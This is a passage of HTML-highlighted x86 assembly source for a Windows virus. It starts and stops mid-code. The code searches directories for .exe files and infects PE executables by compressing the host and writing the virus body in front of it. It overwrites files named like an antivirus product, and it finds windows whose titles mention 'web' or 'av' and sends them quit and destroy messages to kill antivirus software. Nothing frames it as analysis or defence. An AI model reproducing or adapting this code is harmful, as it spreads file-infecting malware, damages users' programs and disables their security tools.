    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ss1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'*.*'</span><span class="sc0"> </span><span class="sc1">; strcat(path,"*.*\0");</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">
</span><span class="sc5">ssagain</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0"> </span><span class="sc1">; skip "." and ".." directories</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">202020h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'3pva'</span><span class="sc0">  </span><span class="sc1">; checking for avp3*.*</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">noAVP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ffn</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">joke</span><span class="sc4">,</span><span class="sc5">ej</span><span class="sc4">-</span><span class="sc5">joke</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc1">; eax pushed</span><span class="sc0">
</span><span class="sc5">noAVP</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">copy1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">copy1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; check directory flag</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">
</span><span class="sc1">; ========= HANDLING DIRECTORY ============</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
</span><span class="sc1">; ============= HANDLING FILE =============</span><span class="sc0">
</span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202000h</span><span class="sc0"> </span><span class="sc1">; convert extension to lower case</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">  </span><span class="sc1">; infect only .exe files</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurName</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,\
</span><span class="sc0">            </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; store file handle</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0"> </span><span class="sc1">; file open error</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">unplen</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">,</span><span class="sc5">GMEM_FIXED</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">unpacked</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; close file</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">*</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; is it exe-file?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">freemem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">freemem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'P'</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">*</span><span class="sc12">'E'</span><span class="sc0">    </span><span class="sc1">; is it PE-file?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">freemem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">freemem</span><span class="sc0"> </span><span class="sc1">; already infected</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">,</span><span class="sc5">GMEM_FIXED</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; get memory for packer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">packed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LZPack</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">mysize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">,</span><span class="sc5">GMEM_FIXED</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">; size of virus in PE-exe</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmdline</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">line1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">line1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc4">,</span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurName</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">unplen</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">plength</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">plength</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">plength</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">


</span><span class="sc5">freemem</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckStop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ssagain</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">retptr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ====== This function terminates our scanning, if host program done =======</span><span class="sc0">
</span><span class="sc5">CheckStop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">EnumWindows</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EnumWindows</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyProc</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">; check for antiviruses, kill them</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">first</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; if first runned, then don't check process</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">retptr</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcessVersion</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcessVersion</span><span class="sc4">,[</span><span class="sc5">processID</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">retptr</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">,[</span><span class="sc5">cmdline1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalDeleteAtom</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalDeleteAtom</span><span class="sc4">,[</span><span class="sc5">atom</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; undefine atom</span><span class="sc0">

</span><span class="sc5">quit1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===================== Check for windows antivirus software ===========</span><span class="sc0">
</span><span class="sc5">MyProc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; found window</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; need for correct enumerating</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wndname</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SendMessageA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendMessageA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WM_GETTEXT</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'be'</span><span class="sc0"> </span><span class="sc1">; dr.web</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Destroy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'va'</span><span class="sc0"> </span><span class="sc1">; "AV" - APV and other antivirus software</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Destroy</span><span class="sc0">

</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0"> </span><span class="sc1">; return true to say system, that we want more windows!</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; two parameters passed</span><span class="sc0">
</span><span class="sc1">; ====================== Seek and Destroy ===========================</span><span class="sc0">
</span><span class="sc5">Destroy</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">kill</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kill</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WM_QUIT</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WM_CLOSE</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WM_ENDSESSION</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">WM_DESTROY</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ======================== LZ77 PACKER ==============================</span><span class="sc0">
</span><span class="sc1">;   packs buffer ([unpacked],size=[unplen]), to ([packed],size=[plength])</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       registers alloc:</span><span class="sc0">
</span><span class="sc1">;           al=first byte from source pointer</span><span class="sc0">
